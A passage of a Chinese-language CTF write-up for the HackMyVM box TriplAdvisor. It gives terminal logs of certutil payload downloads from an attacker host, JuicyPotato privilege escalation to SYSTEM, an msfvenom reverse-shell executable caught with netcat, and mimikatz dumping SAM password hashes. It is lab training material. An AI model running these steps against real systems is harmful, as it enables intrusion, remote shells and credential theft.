06/29/2024  08:09 PM    <DIR>          Administrator
07/13/2009  09:52 PM    <DIR>          Public
06/29/2024  08:11 PM    <DIR>          websvc
               0 File(s)              0 bytes
               5 Dir(s)  23,796,097,024 bytes free

c:\Users>cd websvc/desktop
cd websvc/desktop

c:\Users\websvc\Desktop>certutil.exe -urlcache -split -f http://192.168.10.101:8888/CLSID.list
certutil.exe -urlcache -split -f http://192.168.10.101:8888/CLSID.list
****  Online  ****
  0000  ...
  37c2
CertUtil: -URLCache command completed successfully.

c:\Users\websvc\Desktop>certutil.exe -urlcache -split -f http://192.168.10.101:8888/JuicyPotato.exe
certutil.exe -urlcache -split -f http://192.168.10.101:8888/JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.

c:\Users\websvc\Desktop>certutil.exe -urlcache -split -f http://192.168.10.101:8888/test_clsid.bat
certutil.exe -urlcache -split -f http://192.168.10.101:8888/test_clsid.bat
****  Online  ****
  0000  ...
  011d
CertUtil: -URLCache command completed successfully.

c:\Users\websvc\Desktop>test_clsid.bat
test_clsid.bat
{72A7994A-3092-4054-B6BE-08FF81AEEFFC} 10000
{84D586C4-A423-11D2-B943-00C04F79D22F} 10000
{b8f87e75-d1d5-446b-931c-3f61b97bca7a} 10000
{4D111E08-CBF7-4f12-A926-2C7920AF52FC} 10000
{3B35075C-01ED-45bc-9999-DC2BBDEAC171} 10000
{228fb8f7-fb53-4fd5-8c7b-ff59de606c5b} 10000
{01D0A625-782D-4777-8D4E-547E6457FAD5} 10000
{4BC67F23-D805-4384-BCA3-6F1EDFF50E2C} 10000
{010911E2-F61C-479B-B08C-43E6D1299EFE} 10000
{2b72133b-3f5b-4602-8952-803546ce3344} 10000
{86d5eb8a-859f-4c7b-a76b-2bd819b7a850} 10000
{3050f4d8-98B5-11CF-BB82-00AA00BDCE0B} 10000
{3be9934e-4d1f-4e31-8bc3-8efc710ee0f2} 10000
{87BB326B-E4A0-4de1-94F0-B9F41D0C6059} 10000
{E6442437-6C68-4f52-94DD-2CFED267EFB9} 10000
{6d8ff8e0-730d-11d4-bf42-00b0d0118b56} 10000
{853c9738-9e98-45af-aef4-dc0c6237b388} 10000
------------------------

c:\Users\websvc\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCB3-AE45

 Directory of c:\Users\websvc\Desktop

06/04/2025  05:48 PM    <DIR>          .
06/04/2025  05:48 PM    <DIR>          ..
06/04/2025  05:47 PM            14,274 CLSID.list
06/04/2025  05:47 PM           347,648 JuicyPotato.exe
06/04/2025  05:56 PM             1,101 result.log
06/04/2025  05:48 PM               285 test_clsid.bat
06/30/2024  10:10 AM                33 user.txt
               5 File(s)        363,341 bytes
               2 Dir(s)  23,792,906,240 bytes free

c:\Users\websvc\Desktop>type result.log
type result.log
{9678f47f-2435-475c-b24a-4606f8161c16};TRIPLADVISOR\websvc
{98068995-54d2-4136-9bc9-6dbcb0a4683f};TRIPLADVISOR\websvc
{0289a7c5-91bf-4547-81ae-fec91a89dec5};TRIPLADVISOR\websvc
{9acf41ed-d457-4cc1-941b-ab02c26e4686};TRIPLADVISOR\websvc
{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM
{69AD4AEE-51BE-439b-A92C-86AE490E8B30};NT AUTHORITY\SYSTEM
{F087771F-D74F-4C1A-BB8A-E16ACA9124EA};NT AUTHORITY\SYSTEM
{6d18ad12-bde3-4393-b311-099c346e6df9};NT AUTHORITY\SYSTEM
{d20a3293-3341-4ae8-9aaf-8e397cb63c34};NT AUTHORITY\SYSTEM
{1BE1F766-5536-11D1-B726-00C04FB926AF};NT AUTHORITY\LOCAL SERVICE
{5BF9AA75-D7FF-4aee-AA2C-96810586456D};NT AUTHORITY\LOCAL SERVICE
{A47979D2-C419-11D9-A5B4-001185AD2B89};NT AUTHORITY\LOCAL SERVICE
{8F5DF053-3013-4dd8-B5F4-88214E81C0CF};NT AUTHORITY\SYSTEM
{752073A1-23F2-4396-85F0-8FDB879ED0ED};NT AUTHORITY\SYSTEM
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM
# 这里的每个NT AUTHORITY\SYSTEM都是可以用的
```

然后利用相关工具提权：

```bash

c:\Users\websvc\Desktop>JuicyPotato.exe
JuicyPotato.exe
JuicyPotato v0.1 

Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args: 
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user


c:\Users\websvc\Desktop>JuicyPotato.exe -l 2345 -p c:\Users\websvc\Desktop\revshell.exe -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
JuicyPotato.exe -l 2345 -p c:\Users\websvc\Desktop\revshell.exe -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 2345
....
[+] authresult 0
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\websvc\Desktop>JuicyPotato.exe -l 2345 -p c:\Users\websvc\Desktop\revrootshell.exe -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
JuicyPotato.exe -l 2345 -p c:\Users\websvc\Desktop\revrootshell.exe -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
# 这里这个-l应该是一个转接端口，选一个不常用的就行
Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 2345
....
[+] authresult 0
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

这里是中间进行下载的记录以及新反弹shell的生成：

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ ll           
total 392
-rw-r--r-- 1 kali kali   2246 Jun  4 00:59 44340.txt
-rw-r--r-- 1 kali kali  14274 Jun  4 04:41 CLSID.list
-rw-r--r-- 1 kali kali 347648 Dec  6  2021 JuicyPotato.exe
-rw-r--r-- 1 kali kali   7168 Jun  4 03:48 pentest.exe
drwxr-xr-x 3 root root   4096 Jun  4 00:14 reports
-rw-r--r-- 1 kali kali     87 Jun  4 00:51 reports.json
drwxr-xr-x 3 kali kali   4096 Jun  4 00:51 Result
-rw-r--r-- 1 kali kali   7168 Jun  4 02:28 revshell.exe
-rw-r--r-- 1 kali kali    285 Jun  4 04:41 test_clsid.bat
                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ updog -p 8888
[+] Serving /home/kali/temp/TriplAdvisor...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8888
 * Running on http://10.0.2.4:8888
Press CTRL+C to quit
192.168.10.103 - - [04/Jun/2025 04:43:33] "GET /revshell.exe HTTP/1.1" 200 -
192.168.10.103 - - [04/Jun/2025 04:43:33] "GET /revshell.exe HTTP/1.1" 200 -
192.168.10.103 - - [04/Jun/2025 04:47:09] "GET /CLSID.list HTTP/1.1" 200 -
192.168.10.103 - - [04/Jun/2025 04:47:09] "GET /CLSID.list HTTP/1.1" 200 -
192.168.10.103 - - [04/Jun/2025 04:47:34] "GET /JuicyPotato.exe HTTP/1.1" 200 -
192.168.10.103 - - [04/Jun/2025 04:47:34] "GET /JuicyPotato.exe HTTP/1.1" 200 -
192.168.10.103 - - [04/Jun/2025 04:47:53] "GET /test_clsid.bat HTTP/1.1" 200 -
192.168.10.103 - - [04/Jun/2025 04:47:53] "GET /test_clsid.bat HTTP/1.1" 200 -
192.168.10.103 - - [04/Jun/2025 05:00:39] "GET /revshell.exe HTTP/1.1" 200 -
192.168.10.103 - - [04/Jun/2025 05:00:42] "GET /revshell.exe HTTP/1.1" 200 -
^C
[!] Exiting!
                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ msfvenom --payload windows/x64/shell_reverse_tcp LHOST=192.168.10.101 LPORT=2345 -f exe -o revrootshell.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revrootshell.exe
                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ updog -p 8888                                                                                               
[+] Serving /home/kali/temp/TriplAdvisor...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8888
 * Running on http://10.0.2.4:8888
Press CTRL+C to quit
192.168.10.103 - - [04/Jun/2025 05:09:56] "GET /revrootshell.exe HTTP/1.1" 200 -
192.168.10.103 - - [04/Jun/2025 05:09:56] "GET /revrootshell.exe HTTP/1.1" 200 -
^C
[!] Exiting!
                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ rlwrap nc -lnvp 2345
listening on [any] 2345 ...
whoami
connect to [192.168.10.101] from (UNKNOWN) [192.168.10.103] 49636
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

最后得到了rootshell！

## 票据的利用

这里就获取rootflag来说已经结束了，但是还可以有新的拓展，具体可以参考这个师傅说的https://www.linuxsec.org/2024/10/hackmyvm-tripladvisor-writeup.html ，这里仅复现学习一下：

使用 `Mimikatz` 进行提取，然后进行利用`impacket-psexec`进行登录

```bash
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ rlwrap nc -lnvp 2345
listening on [any] 2345 ...
whoami
connect to [192.168.10.101] from (UNKNOWN) [192.168.10.103] 49636
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd c:\Users\websvc\Desktop
cd c:\Users\websvc\Desktop

c:\Users\websvc\Desktop>certutil.exe -urlcache -split -f http://192.168.10.101:8888/mimikatz.exe
certutil.exe -urlcache -split -f http://192.168.10.101:8888/mimikatz.exe
****  Online  ****
  000000  ...
  131308
CertUtil: -URLCache command completed successfully.

c:\Users\websvc\Desktop>mimikatz.exe privilege::debug token::elevate lsadump::sam exit
mimikatz.exe privilege::debug token::elevate lsadump::sam exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

236     {0;000003e7} 0 D 7912           NT AUTHORITY\SYSTEM     S-1-5-18        (04g,30p)       Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 655950      NT AUTHORITY\SYSTEM     S-1-5-18        (23g,27p)       Primary
 * Thread Token  : {0;000003e7} 0 D 663742      NT AUTHORITY\SYSTEM     S-1-5-18        (04g,30p)       Impersonation (Delegation)

mimikatz(commandline) # lsadump::sam
Domain : TRIPLADVISOR
SysKey : 129514b2fa60646a00037e4df6fc3d3f
Local SID : S-1-5-21-2621822639-2474692399-1676906194

SAMKey : d8c54e5c64e72b5baade016eaca4eea6

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 2176416a80e4f62804f101d3a55d6c93

RID  : 000001f5 (501)
User : Guest

RID  : 000003eb (1003)
User : websvc
  Hash NTLM: b0a913673f4f8d5debc49f8fcbbdbb68

mimikatz(commandline) # exit
Bye!
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506041737272.png" alt="image-20250604173636415" style="zoom:50%;" />